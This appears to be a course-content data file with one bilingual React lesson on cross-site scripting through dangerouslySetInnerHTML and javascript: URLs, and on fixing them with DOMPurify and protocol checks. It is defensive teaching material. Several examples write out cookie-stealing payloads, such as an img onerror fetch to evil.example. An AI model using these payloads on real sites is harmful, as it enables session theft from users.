/**
 * React Complete Course — Module 6: Pro, lesson 9.
 *
 * XSS and dangerouslySetInnerHTML: React escapes everything rendered
 * through ordinary JSX ({comment.text}) automatically, treating it as
 * plain text no matter what it contains — this is why cross-site
 * scripting is rare in typical React code. dangerouslySetInnerHTML
 * deliberately bypasses that protection, and its name is not decorative:
 * using it on unsanitized user-submitted content lets an attacker inject
 * a payload (commonly an <img onerror=...> or similar event-handler
 * attribute, since a literal <script> tag inserted this way does not
 * execute) that runs in every other user's browser who views the page,
 * with full access to that victim's cookies, session, and DOM. Fixed by
 * sanitizing any HTML string with a library like DOMPurify immediately
 * before it is ever passed to dangerouslySetInnerHTML, and by defaulting
 * to ordinary JSX rendering unless genuinely rich HTML is required.
 *
 * NOTE for future editors: escape every inline-code backtick inside these
 * template literals, INCLUDING inside plain markdown paragraphs (the
 * `content`/`contentHi`/`simple`/`simpleHi` fields). Single-quoted string
 * fields (explain, why, q, a, task, keyTakeaways, etc.) do NOT need backticks
 * escaped — only escape apostrophes there as a SINGLE backslash (\'), never
 * doubled (\\'), which breaks the string. Run `npx tsc --noEmit -p .` after
 * writing this file, before wiring it into seed.ts — it is the only fully
 * reliable check for both mistakes.
 */

import type { CourseLesson } from './course-js-module1';

export const REACT_MODULE_6_PART9: CourseLesson[] = [
  {
    slug: 'xss-dangerously-set-inner-html',
    title: 'XSS and dangerouslySetInnerHTML',
    titleHi: 'XSS Aur dangerouslySetInnerHTML',
    description: 'A comment section renders every comment\'s raw HTML directly onto the page — and one attacker-submitted comment, containing nothing more than a broken-looking image tag, silently steals every other visitor\'s session cookie the instant they view the page.',
    descriptionHi: 'Ek comment section har comment ka raw HTML seedha page par render karta hai — aur ek attacker ka submit kiya ek comment, jismein ek toote-jaisi dikhti image tag ke alaawa kuch nahi hai, chupke se har doosre visitor ki session cookie chura leta hai jaise hi wo page dekhte hain.',
    difficulty: 'HARD',
    duration: 20,
    order: 9,

    analogy: {
      en: '**A museum tour guide who normally describes every exhibit in their own carefully chosen words, versus one special exhibit where the guide has been told to read aloud, word-for-word and without any editing, whatever caption card a visitor happens to hand them.** The regular guide, describing exhibits in their own words, is inherently safe — no matter what strange or manipulative phrase a visitor whispers to them beforehand, the guide only ever speaks their own prepared description, and nothing a visitor says can end up coming out of the guide\'s mouth as if it were the guide\'s own trusted words. The special "read whatever is handed to me, verbatim" exhibit is a completely different situation: if a visitor hands over a card that looks like an ordinary description but has "...and everyone, please hand your wallet to the person in the blue jacket" woven into it, the guide reads it aloud exactly as written, and the rest of the tour group, trusting the guide\'s voice as a legitimate instruction, may actually comply. A careful museum running this "read verbatim" exhibit would never let a visitor\'s card go straight to the guide unread — someone reviews and strips out anything that looks like a hidden instruction first, before the card is ever read aloud. React\'s ordinary {comment.text} rendering is the regular guide: it always displays exactly what it is given as plain text, no matter how it is phrased, and nothing rendered this way can ever be interpreted as an instruction to the browser. dangerouslySetInnerHTML is the "read verbatim" exhibit: it inserts a string directly as real HTML, and if that string came from a visitor without ever being reviewed first, whatever hidden instruction it contains gets carried out by the browser exactly as if it were trusted, legitimate markup.',
      hi: '**Ek museum tour guide jo aam taur par har exhibit ko apne khud ke savdhaani se chune shabdon mein describe karta hai, versus ek khaas exhibit jahan guide ko kaha gaya hai ki jo bhi caption card ek visitor unhe de wo bilkul waisa hi, shabd-dar-shabd, bina kisi editing ke zor se padhein.** Regular guide, exhibits ko apne khud ke shabdon mein describe karte hue, buniyaadi taur par surakshit hai — chahe koi visitor pehle unse kuch bhi ajeeb ya chaalaaki-bhara vaakya phusfusaaye, guide sirf apna khud ka taiyaar description bolta hai, aur koi visitor jo kahe wo guide ke muh se aise kabhi nahi nikal sakta jaise guide ke khud ke bharosemand shabd hon. Khaas "jo diya jaaye wahi bolo" wala exhibit poori tarah alag sthiti hai: agar ek visitor ek card deta hai jo ek aam description jaisa dikhta hai par jismein "...aur sab log, kripya apna wallet neele jacket wale vyakti ko de dein" bunaa hua hai, guide ise bilkul likhe hue jaisa zor se padhta hai, aur baaki tour group, guide ki aawaaz ko ek vaidh nirdesh maankar, asal mein maan bhi sakta hai. Ek savdhaan museum jo ye "verbatim padho" wala exhibit chalaata hai kabhi ek visitor ke card ko seedhe guide tak bina padhe nahi jaane dega — koi pehle use review karta hai aur kuch bhi jo ek chhupi hui nirdesh jaisa dikhta hai use hataata hai, card ko zor se padhe jaane se pehle. React ka aam \`{comment.text}\` rendering regular guide hai: ye hamesha bilkul wahi dikhaata hai jo ise diya gaya hai plain text ki tarah, chahe ye kaise bhi phrase kiya gaya ho, aur is tarike se render hui koi bhi cheez kabhi browser ke liye ek nirdesh ki tarah samjhi nahi jaa sakti. \`dangerouslySetInnerHTML\` "verbatim padho" wala exhibit hai: ye ek string ko seedhe asli HTML ki tarah daalta hai, aur agar wo string ek visitor se aayi thi pehle kabhi review kiye bina, jo bhi chhupi hui nirdesh ismein hai wo browser dwara bilkul waise hi poori ki jaati hai jaise ye bharosemand, vaidh markup ho.',
    },

    simple: `**Start broken.** A comment section rendering raw HTML directly, with no sanitization:

\`\`\`jsx
function Comment({ comment }) {
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: comment.text }} />
    </div>
  );
}
\`\`\`

For an ordinary comment like \`"Great post, thanks!"\`, this renders exactly as expected. The danger appears the moment an attacker submits a comment containing something like \`<img src="x" onerror="fetch('https://evil.example/steal?cookie=' + document.cookie)">\` instead of ordinary text. \`dangerouslySetInnerHTML\` inserts this string directly into the page as real, live HTML — the browser genuinely parses it as an \`<img>\` tag, the deliberately broken \`src="x"\` fails to load, and that failure triggers the \`onerror\` attribute, which is genuine, executable JavaScript. This script runs in the browser of every single OTHER visitor who later views this page and its comment section, with full access to whatever that visitor\'s browser has: their session cookies, anything in \`localStorage\`, and the ability to make requests as if it were that visitor\'s own logged-in browser making them, all without that visitor ever clicking anything or knowingly doing anything wrong.

**The fix: sanitize any HTML string before it is ever passed to dangerouslySetInnerHTML**

\`\`\`jsx
import DOMPurify from "dompurify";

function Comment({ comment }) {
  const cleanHtml = DOMPurify.sanitize(comment.text);
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
    </div>
  );
}
\`\`\`

\`\`\`tsx
import DOMPurify from "dompurify";

interface CommentData {
  author: string;
  text: string;
}

function Comment({ comment }: { comment: CommentData }) {
  const cleanHtml: string = DOMPurify.sanitize(comment.text);
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
    </div>
  );
}
\`\`\`

\`DOMPurify.sanitize\` parses the incoming HTML string and strips out anything that could actually execute — event-handler attributes like \`onerror\` and \`onclick\`, \`<script>\` tags, \`javascript:\` URLs in \`href\` or \`src\` — while preserving genuinely harmless formatting markup (\`<b>\`, \`<i>\`, a plain \`<a href="https://...">\`) that a real rich-text comment might legitimately contain. The malicious \`<img onerror=...>\` from the broken example either has its \`onerror\` attribute removed entirely or is stripped altogether, so the exact same comment, rendered through \`cleanHtml\` instead of the raw \`comment.text\`, displays as inert, non-executing markup rather than running arbitrary JavaScript in every visitor\'s browser.`,

    simpleHi: `**Toote hue se shuru.** Ek comment section jo raw HTML seedha render karta hai, koi sanitization bina:

\`\`\`jsx
function Comment({ comment }) {
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: comment.text }} />
    </div>
  );
}
\`\`\`

Ek aam comment jaise \`"Great post, thanks!"\` ke liye, ye bilkul ummeed ke hisaab se render hota hai. Khatra tab dikhta hai jab ek attacker ek comment submit karta hai jismein aam text ke bajaye kuch aisa hai jaise \`<img src="x" onerror="fetch('https://evil.example/steal?cookie=' + document.cookie)">\`. \`dangerouslySetInnerHTML\` is string ko seedhe page mein asli, live HTML ki tarah daalta hai — browser ise sach mein ek \`<img>\` tag ki tarah parse karta hai, jaan-boojhkar toota \`src="x"\` load hone mein fail hota hai, aur wo failure \`onerror\` attribute ko trigger karti hai, jo asli, chalta JavaScript hai. Ye script har akele DOOSRE visitor ke browser mein chalta hai jo baad mein is page aur uske comment section ko dekhta hai, us visitor ke browser ke paas jo kuch bhi hai uski poori access ke saath: unki session cookies, \`localStorage\` mein kuch bhi, aur requests karne ki kshamta jaise wo us visitor ke apne logged-in browser ne unhe banaaya ho, sab kuch us visitor ke kabhi kuch bhi click kiye bina ya jaante hue kuch galat kiye bina.

**Fix: kisi bhi HTML string ko sanitize karo isse pehle ki ye kabhi \`dangerouslySetInnerHTML\` ko diya jaaye**

\`\`\`jsx
import DOMPurify from "dompurify";

function Comment({ comment }) {
  const cleanHtml = DOMPurify.sanitize(comment.text);
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
    </div>
  );
}
\`\`\`

\`\`\`tsx
import DOMPurify from "dompurify";

interface CommentData {
  author: string;
  text: string;
}

function Comment({ comment }: { comment: CommentData }) {
  const cleanHtml: string = DOMPurify.sanitize(comment.text);
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
    </div>
  );
}
\`\`\`

\`DOMPurify.sanitize\` aati HTML string ko parse karta hai aur kuch bhi hataata hai jo asal mein chal sakta hai — \`onerror\` aur \`onclick\` jaise event-handler attributes, \`<script>\` tags, \`href\` ya \`src\` mein \`javascript:\` URLs — jabki sach mein hanikaarak-na-lagu formatting markup (\`<b>\`, \`<i>\`, ek saadha \`<a href="https://...">\`) ko rakhte hue jo ek asli rich-text comment mein vaidh roop se ho sakta hai. Toote example ka malicious \`<img onerror=...>\` ya to apna \`onerror\` attribute poori tarah hataaya hua paata hai ya poori tarah hataaya jaata hai, taaki bilkul wahi comment, raw \`comment.text\` ke bajaye \`cleanHtml\` ke through render hote hue, ek na-chalti, na-execute-hoti markup ki tarah dikhta hai har visitor ke browser mein manmaana JavaScript chalaane ke bajaye.`,

    content: `## Why ordinary JSX rendering is already safe, and what changes with dangerouslySetInnerHTML

\`\`\`jsx
// Ordinary JSX — React escapes this automatically, no matter what it contains
<div>{comment.text}</div>
// If comment.text is "<img src=x onerror=alert(1)>", this renders the LITERAL
// TEXT "<img src=x onerror=alert(1)>" on the page — it is never parsed as HTML

// dangerouslySetInnerHTML — bypasses that escaping entirely
<div dangerouslySetInnerHTML={{ __html: comment.text }} />
// The exact same string is now parsed as real HTML, and the onerror
// attribute genuinely executes
\`\`\`

When a value is rendered through ordinary JSX curly braces, React always treats it as plain text and escapes any characters that would otherwise have special meaning in HTML (\`<\`, \`>\`, \`&\`, and so on) before inserting it into the page — this is why a string containing what looks like an HTML tag simply displays as literal, visible text rather than being interpreted as markup. \`dangerouslySetInnerHTML\` exists specifically to opt OUT of this automatic protection, for the genuine, occasional case where a component needs to insert real HTML markup rather than plain text (rendering markdown that has already been converted to HTML, displaying content from a trusted CMS). Its unusual name is a deliberate, explicit warning built into the API itself: React\'s own documentation names it this way specifically so a developer cannot use it by accident without consciously acknowledging they are bypassing a real safety mechanism.

## Where this vulnerability actually shows up in real applications

\`\`\`jsx
// Common real-world sources of a string eventually reaching dangerouslySetInnerHTML:
<div dangerouslySetInnerHTML={{ __html: markdownToHtml(userBio) }} />       // a markdown-rendered user bio
<div dangerouslySetInnerHTML={{ __html: cmsContent.body }} />               // content from a CMS
<div dangerouslySetInnerHTML={{ __html: richTextEditorOutput }} />          // a WYSIWYG editor's saved output
\`\`\`

The vulnerable pattern rarely appears as an obviously reckless line of code — it typically shows up wherever an application needs to render genuinely rich, formatted content: a markdown-to-HTML converter applied to a user\'s bio, a rich-text editor\'s saved HTML output, content pulled from a content-management system that itself allows HTML. In every one of these cases, the underlying string can still ultimately trace back to something a user typed or submitted at some point, even if it passed through several processing steps first, and the same sanitization principle applies regardless of how indirectly the untrusted content arrived.

## Why sanitizing on the frontend still matters even if the backend already validates input

\`\`\`
Backend validation happening at all does not guarantee the specific
string reaching THIS render is safe — a different endpoint, an older
record saved before validation existed, or a genuinely different code
path could all still produce an unsanitized string arriving here.
\`\`\`

A reasonable question is why sanitization matters in the component that renders the content, if the backend already validates or sanitizes input when it is first submitted. The honest answer is the same defense-in-depth principle covered elsewhere in this curriculum for backend validation: trusting that a value reaching a specific point in the code has already been safely handled somewhere upstream is a fragile assumption that a single missed code path, an older record saved before a validation rule existed, or a completely different route that writes to the same field can quietly violate. Sanitizing immediately before the value is actually used in a dangerous way — right where \`dangerouslySetInnerHTML\` is called — means the protection holds regardless of whether every possible upstream path was actually careful, rather than depending on all of them being correct simultaneously.

## dangerouslySetInnerHTML is the most common vector, but not the only one

\`\`\`jsx
// Also dangerous: rendering a user-controlled URL directly into an href
<a href={comment.website}>Visit their site</a>
// If comment.website is "javascript:fetch('https://evil.example/steal?c='+document.cookie)",
// clicking this link executes that JavaScript
\`\`\`

While \`dangerouslySetInnerHTML\` is the single most common source of a genuine XSS vulnerability in a React application, it is not the only surface where user-controlled content can end up executing. A user-supplied URL rendered directly into an \`href\` attribute can contain a \`javascript:\` scheme instead of a normal \`http\`/\`https\` URL, and clicking a link with a \`javascript:\` href executes that script exactly as if it were run from the console — validating that a user-supplied URL actually starts with \`http://\` or \`https://\` before rendering it as a link closes this specific, separate gap.`,

    contentHi: `## Aam JSX rendering pehle se surakshit kyun hai, aur \`dangerouslySetInnerHTML\` ke saath kya badalta hai

\`\`\`jsx
// Aam JSX — React ise automatically escape karta hai, ismein kuch bhi ho
<div>{comment.text}</div>
// Agar comment.text hai "<img src=x onerror=alert(1)>", ye page par LITERAL
// TEXT "<img src=x onerror=alert(1)>" render karta hai — ye kabhi HTML ki tarah parse nahi hota

// dangerouslySetInnerHTML — us escaping ko poori tarah bypass karta hai
<div dangerouslySetInnerHTML={{ __html: comment.text }} />
// Bilkul wahi string ab asli HTML ki tarah parse hoti hai, aur onerror
// attribute sach mein execute hota hai
\`\`\`

Jab ek value aam JSX curly braces ke through render hoti hai, React ise hamesha plain text ki tarah treat karta hai aur kisi bhi character ko escape karta hai jo warna HTML mein khaas matlab rakhta (\`<\`, \`>\`, \`&\`, waghaira) use page mein daalne se pehle — bilkul isi wajah se ek string jismein ek HTML tag jaisa kuch dikhta hai bas literal, dikhta text ki tarah dikhti hai markup ki tarah samjhi jaane ke bajaye. \`dangerouslySetInnerHTML\` khaas taur par is automatic protection se BAAHAR nikalne ke liye maujood hai, un asli, kabhi-kabhi hone waale case ke liye jahan ek component ko plain text ke bajaye asli HTML markup daalni hai (markdown render karna jo pehle se HTML mein badla ja chuka hai, ek bharosemand CMS se content dikhaana). Iska ajeeb naam khud API mein banaaya gaya ek jaan-boojhkar, explicit chetaavni hai: React ki apni documentation ise khaas taur par is naam se pukaarti hai taaki ek developer galti se ise istemal na kar sake bina saqriya taur par ye sweekaar kiye ki wo ek asli safety mechanism bypass kar rahe hain.

## Ye vulnerability asli applications mein asal mein kahaan dikhti hai

\`\`\`jsx
// Aam asli-duniya srot jinse ek string aakhirkaar dangerouslySetInnerHTML tak pahunchti hai:
<div dangerouslySetInnerHTML={{ __html: markdownToHtml(userBio) }} />       // ek markdown-rendered user bio
<div dangerouslySetInnerHTML={{ __html: cmsContent.body }} />               // ek CMS se content
<div dangerouslySetInnerHTML={{ __html: richTextEditorOutput }} />          // ek WYSIWYG editor ka saved output
\`\`\`

Vulnerable pattern kam hi ek saaf taur par laapervaah code line ki tarah dikhta hai — ye aam taur par wahaan dikhta hai jahan ek application ko sach mein rich, formatted content render karni hai: ek user ke bio par lagu ek markdown-se-HTML converter, ek rich-text editor ka saved HTML output, ek content-management system se khinch aaya content jo khud HTML ki ijaazat deta hai. In sab cases mein, underlying string phir bhi aakhirkaar kisi cheez tak track ki jaa sakti hai jo ek user ne kisi point par type ya submit ki, chahe ye pehle kai processing steps se guzri ho, aur wahi sanitization siddhaant lagu hota hai chahe na-bharosemand content kitni bhi indirectly aayi ho.

## Frontend par sanitize karna phir bhi kyun maayne rakhta hai chahe backend pehle se input validate karta ho

\`\`\`
Backend validation bilkul hona ye zamanat nahi deta ki wo khaas string
jo IS render tak pahunchti hai surakshit hai — ek alag endpoint, ek
purana record jo validation maujood hone se pehle save hua tha, ya ek
sach mein alag code path sab yahaan ek na-sanitize-hui string pahunchaa sakte hain.
\`\`\`

Ek samajhdaar sawaal ye hai ki sanitization us component mein kyun maayne rakhta hai jo content render karta hai, agar backend pehle se input ko validate ya sanitize karta hai jab ye pehli baar submit hoti hai. Imaandaar jawaab wahi defense-in-depth siddhaant hai jo is curriculum mein kahin aur backend validation ke liye cover kiya gaya: bharosa karna ki code mein ek khaas point tak pahunchti ek value pehle se kahin upstream surakshit taur par sambhaali ja chuki hai ek fragile dhaarna hai jise ek chhoota hua code path, ek purana record jo ek validation rule maujood hone se pehle save hua tha, ya usi field mein likhta ek poori tarah alag route chupke se tod sakta hai. Value ko asal mein ek khatarnaak tarike se istemal hone se turant pehle sanitize karna — bilkul wahaan jahan \`dangerouslySetInnerHTML\` bulaayi jaati hai — matlab hai protection tikti hai chahe har mumkin upstream path asal mein savdhaan tha ya nahi, un sabke ek saath sahi hone par nirbhar hone ke bajaye.

## \`dangerouslySetInnerHTML\` sabse aam vector hai, par ekmatra nahi

\`\`\`jsx
// Bhi khatarnaak: ek user-niyantrit URL ko seedhe ek href mein render karna
<a href={comment.website}>Visit their site</a>
// Agar comment.website hai "javascript:fetch('https://evil.example/steal?c='+document.cookie)",
// is link ko click karna wo JavaScript chalaata hai
\`\`\`

Chahe \`dangerouslySetInnerHTML\` ek React application mein ek asli XSS vulnerability ka sabse aam akela srot hai, ye ekmatra surface nahi hai jahan user-niyantrit content aakhirkaar chal sakta hai. Ek user-diya URL jo seedhe ek \`href\` attribute mein render hoti hai ek normal \`http\`/\`https\` URL ke bajaye ek \`javascript:\` scheme rakh sakti hai, aur ek \`javascript:\` href wale link ko click karna wo script bilkul waise chalaata hai jaise ye console se chalaayi gayi ho — verify karna ki ek user-diya URL asal mein \`http://\` ya \`https://\` se shuru hoti hai use link ki tarah render karne se pehle is khaas, alag gap ko band karta hai.`,

    examples: [
      {
        title: 'Broken: unsanitized user comment rendered as raw HTML',
        titleHi: 'Toota: na-sanitize-hua user comment raw HTML ki tarah render hota hai',
        code: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />
// comment.text = '<img src="x" onerror="stealCookies()">'`,
        codeJs: `function Comment({ comment }) {
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: comment.text }} />
    </div>
  );
}
// an attacker's comment.text of '<img src="x" onerror="fetch(\\'https://evil.example?c=\\'+document.cookie)">'
// runs in every other visitor's browser who views this comment`,
        codeTs: `interface CommentData {
  author: string;
  text: string;
}

function Comment({ comment }: { comment: CommentData }) {
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: comment.text }} />
    </div>
  );
}
// TypeScript does not catch this — comment.text is correctly typed as
// "string". This is a security practice issue, entirely outside what
// a type checker can catch.`,
        output: `An ordinary comment renders fine. An attacker's malicious comment
silently executes JavaScript in every other visitor's browser who
views the page, with access to that visitor's cookies and session.`,
        explain: 'dangerouslySetInnerHTML inserts the string as real, parsed HTML with no filtering at all — an attacker-controlled string becomes attacker-controlled, executable markup on every other visitor\'s page.',
        explainHi: '\`dangerouslySetInnerHTML\` string ko asli, parsed HTML ki tarah daalta hai koi filtering bilkul bina — ek attacker-niyantrit string har doosre visitor ke page par attacker-niyantrit, chalti markup ban jaati hai.',
      },
      {
        title: 'Fixed: DOMPurify strips executable content before rendering',
        titleHi: 'Theek: DOMPurify render karne se pehle chalti content hataata hai',
        code: `const cleanHtml = DOMPurify.sanitize(comment.text);
<div dangerouslySetInnerHTML={{ __html: cleanHtml }} />`,
        codeJs: `import DOMPurify from "dompurify";

function Comment({ comment }) {
  const cleanHtml = DOMPurify.sanitize(comment.text);
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
    </div>
  );
}
// the same malicious comment.text now has its onerror attribute
// stripped before it ever reaches the DOM`,
        codeTs: `import DOMPurify from "dompurify";

interface CommentData {
  author: string;
  text: string;
}

function Comment({ comment }: { comment: CommentData }) {
  const cleanHtml: string = DOMPurify.sanitize(comment.text);
  return (
    <div className="comment">
      <strong>{comment.author}</strong>
      <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />
    </div>
  );
}`,
        outputJs: `The malicious <img onerror=...> is stripped down to a harmless
<img src="x">, or removed entirely, depending on DOMPurify's default
configuration — no JavaScript executes for any visitor.`,
        outputTs: `// Identical behaviour. DOMPurify.sanitize's return type is always
// "string" — a value already safe to hand directly to
// dangerouslySetInnerHTML's __html key.`,
        explain: 'DOMPurify actively parses and rewrites the HTML, removing anything that could execute, rather than just checking whether the string looks suspicious.',
        explainHi: 'DOMPurify saqriya taur par HTML ko parse aur dobara likhta hai, kuch bhi jo chal sakta hai use hataate hue, sirf ye check karne ke bajaye ki string sandigdh dikhti hai ya nahi.',
      },
      {
        title: 'A javascript: URL executing through an ordinary href, not dangerouslySetInnerHTML',
        titleHi: 'Ek \`javascript:\` URL jo ek aam \`href\` se chalta hai, \`dangerouslySetInnerHTML\` se nahi',
        code: `<a href={comment.website}>Visit</a>
// comment.website = "javascript:stealCookies()"`,
        codeJs: `function isSafeUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return parsed.protocol === "http:" || parsed.protocol === "https:";
  } catch {
    return false;
  }
}

function Comment({ comment }) {
  return (
    <div>
      {isSafeUrl(comment.website) ? (
        <a href={comment.website}>Visit their site</a>
      ) : (
        <span>(invalid link)</span>
      )}
    </div>
  );
}`,
        codeTs: `function isSafeUrl(url: string): boolean {
  try {
    const parsed = new URL(url, window.location.origin);
    return parsed.protocol === "http:" || parsed.protocol === "https:";
  } catch {
    return false;
  }
}

function Comment({ comment }: { comment: { website: string } }) {
  return (
    <div>
      {isSafeUrl(comment.website) ? (
        <a href={comment.website}>Visit their site</a>
      ) : (
        <span>(invalid link)</span>
      )}
    </div>
  );
}`,
        outputJs: `A comment.website of "javascript:stealCookies()" fails the protocol
check and renders as plain text instead of a clickable link — nothing
executes even if a visitor clicks where the link would have been.`,
        outputTs: `// Identical behaviour. Validating the protocol explicitly, rather
// than just checking the string doesn't start with "javascript",
// correctly handles case variations and whitespace tricks a naive
// string check could miss.`,
        explain: 'This vulnerability has nothing to do with dangerouslySetInnerHTML — a user-controlled URL rendered into a normal href attribute is a separate XSS surface entirely.',
        explainHi: 'Ye vulnerability \`dangerouslySetInnerHTML\` se koi lena-dena nahi rakhti — ek user-niyantrit URL jo ek aam \`href\` attribute mein render hoti hai ek poori tarah alag XSS surface hai.',
      },
    ],

    mistakes: [
      {
        wrong: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />
// raw, user-submitted content inserted as live HTML with no sanitization`,
        right: `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.text) }} />`,
        why: 'Passing an unsanitized, user-controlled string directly to dangerouslySetInnerHTML lets an attacker\'s HTML/JavaScript run in every other visitor\'s browser who views the page.',
        whyHi: 'Ek na-sanitize-hui, user-niyantrit string ko seedhe \`dangerouslySetInnerHTML\` ko dena ek attacker ke HTML/JavaScript ko har doosre visitor ke browser mein chalne deta hai jo page dekhta hai.',
      },
      {
        wrong: `// Using dangerouslySetInnerHTML for content that never needed real HTML at all
<div dangerouslySetInnerHTML={{ __html: comment.text }} />
// comment.text is just plain text — no markup was ever actually needed here`,
        right: `<div>{comment.text}</div>
// ordinary JSX rendering, automatically escaped, no sanitization library needed at all`,
        why: 'Reaching for dangerouslySetInnerHTML by habit for content that is genuinely just plain text introduces an unnecessary security risk that ordinary JSX rendering never has in the first place.',
        whyHi: 'Aadat se \`dangerouslySetInnerHTML\` ki taraf jaana aise content ke liye jo asal mein bas plain text hai ek bekaar security khatra le aata hai jo aam JSX rendering ke paas shuru se hi kabhi nahi hota.',
      },
      {
        wrong: `// Trusting that backend validation already made this string safe,
// so skipping sanitization at the point of rendering
<div dangerouslySetInnerHTML={{ __html: cmsContent.body }} />`,
        right: `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(cmsContent.body) }} />
// sanitize immediately before rendering, regardless of what upstream validation may have done`,
        why: 'Assuming a value reaching dangerouslySetInnerHTML is already safe because some upstream step should have validated it is a fragile assumption a single missed code path or older record can silently violate.',
        whyHi: 'Ye maan lena ki \`dangerouslySetInnerHTML\` tak pahunchti ek value pehle se surakshit hai kyunki kisi upstream step ne use validate kiya hoga ek fragile dhaarna hai jise ek chhoota hua code path ya ek purana record chupke se tod sakta hai.',
      },
    ],

    realWorld: [
      {
        en: '**Cross-site scripting (XSS) has consistently ranked among the OWASP Top 10 most critical web application security risks**, and dangerouslySetInnerHTML is React\'s own officially documented, explicitly named escape hatch specifically for the one scenario where this risk becomes directly relevant.',
        hi: '**Cross-site scripting (XSS) lagaataar OWASP Top 10 ke sabse critical web application security risks mein shaamil raha hai**, aur \`dangerouslySetInnerHTML\` React ka apna officially documented, explicitly-naam-diya escape hatch hai bilkul us ek scenario ke liye jahan ye khatra seedhe maayne rakhta hai.',
      },
      {
        en: '**DOMPurify is a widely adopted, actively maintained sanitization library used across a huge share of real production applications**, specifically because writing a correct, complete HTML sanitizer by hand is genuinely difficult to get right.',
        hi: '**DOMPurify ek vyaapak roop se apnaayi gayi, saqriya-roop-se-maintain-ki-jaati sanitization library hai jo asli production applications ke ek bade hisse mein istemal hoti hai**, khaas taur par isliye kyunki haath se ek sahi, poora HTML sanitizer likhna asal mein sahi karna mushkil hai.',
      },
      {
        en: '**Real, publicly documented XSS vulnerabilities in production applications have repeatedly traced back to rendering unsanitized user content through an HTML-insertion API** — this is not a hypothetical risk invented for teaching purposes.',
        hi: '**Production applications mein asli, saarvajanik roop se documented XSS vulnerabilities baar-baar ek HTML-insertion API ke zariye na-sanitize-hui user content render karne tak track ki gayi hain** — ye koi kalpaniya khatra nahi hai jo padhaane ke maqsad se banaaya gaya.',
      },
    ],

    interviewQA: [
      {
        q: 'Why does ordinary JSX rendering like {comment.text} protect against XSS automatically, while dangerouslySetInnerHTML does not?',
        qHi: 'Aam JSX rendering jaise \`{comment.text}\` XSS ke khilaaf automatically kaise surakshit karta hai, jabki \`dangerouslySetInnerHTML\` nahi karta?',
        a: 'When a value is rendered through ordinary JSX curly-brace syntax, React treats that value strictly as text content to display, and before inserting it into the actual DOM, it escapes any character that would otherwise carry special meaning in HTML — characters like "<" and ">" are converted into their escaped representations rather than being inserted literally. This means a string like "<img src=x onerror=alert(1)>", when rendered through {comment.text}, appears on the page as the literal, visible characters of that string, exactly as typed, and the browser never interprets it as an actual HTML tag at all, since the escaped characters no longer form real markup syntax by the time they reach the DOM. dangerouslySetInnerHTML works through a fundamentally different mechanism: rather than treating its input as text to escape and display, it hands the string directly to the DOM\'s own innerHTML-setting behavior, which genuinely parses that string as HTML and constructs real DOM elements and attributes from it. A string containing an onerror attribute, passed through dangerouslySetInnerHTML, becomes a genuine onerror attribute on a genuine, live DOM element, and the browser executes it under exactly the same conditions it would execute any other legitimately authored onerror handler, since by that point the browser has no way to distinguish content that originated from user input versus content the developer wrote directly.',
        aHi: 'Jab ek value aam JSX curly-brace syntax ke through render hoti hai, React us value ko sakhti se dikhaane ke liye text content ki tarah treat karta hai, aur ise asli DOM mein daalne se pehle, kisi bhi character ko escape karta hai jo warna HTML mein khaas matlab rakhta — "<" aur ">" jaise characters ko unke escaped pratinidhitva mein badla jaata hai literal roop se daale jaane ke bajaye. Iska matlab hai ek string jaisi "<img src=x onerror=alert(1)>", jab \`{comment.text}\` ke through render hoti hai, page par us string ke literal, dikhte characters ki tarah dikhti hai, bilkul jaisi type ki gayi, aur browser ise kabhi ek asli HTML tag ki tarah bilkul samajhta hi nahi, kyunki escaped characters DOM tak pahunchne tak asli markup syntax nahi banaate. \`dangerouslySetInnerHTML\` ek buniyaadi taur par alag mechanism se kaam karta hai: apne input ko escape aur dikhaane ke liye text ki tarah treat karne ke bajaye, ye string ko seedhe DOM ke apne innerHTML-set-karne wale vyavhaar ko sonp deta hai, jo sach mein us string ko HTML ki tarah parse karta hai aur usse asli DOM elements aur attributes banaata hai. Ek \`onerror\` attribute rakhti string, \`dangerouslySetInnerHTML\` se guzarte hue, ek asli, live DOM element par ek asli \`onerror\` attribute ban jaati hai, aur browser ise bilkul usi sthiti mein execute karta hai jismein ye kisi bhi doosre vaidh roop se likhe gaye \`onerror\` handler ko karega, kyunki us point tak browser ke paas is baat mein antar karne ka koi tarika nahi hai ki content user input se aayi ya developer ne khud likhi.',
      },
      {
        q: 'Why is validating a user-submitted string on the backend not, by itself, sufficient reason to skip sanitization in the frontend component that renders it?',
        qHi: 'Ek backend par ek user-submit hui string validate karna, khud se, us frontend component mein sanitization skip karne ka kaafi kaaran kyun nahi hai jo ise render karta hai?',
        a: 'Backend validation genuinely reduces risk, but relying on it as the ONLY safeguard requires a strong, often unstated assumption: that every single string that could ever reach this specific rendering location has, without exception, already passed through that exact validation step, correctly, every time. In any real, evolving application, this assumption is fragile in several concrete ways. A different API endpoint or code path might write to the same underlying field without going through the validation logic the developer is thinking of when reasoning about safety. Data already stored before a validation rule was introduced or tightened remains in its original, unvalidated form indefinitely unless a separate migration specifically re-processes it. A future change to the validation logic itself, or a bug introduced during a refactor, could silently weaken or bypass a check that used to be reliable, with nothing about the rendering component itself changing to reflect that the guarantee it was implicitly depending on no longer holds. Sanitizing immediately at the point where a string is actually about to be rendered as HTML removes this entire chain of assumptions: the rendering code protects itself directly, based on the actual content it is about to display, rather than trusting that some other part of the system, possibly written by a different person at a different time for 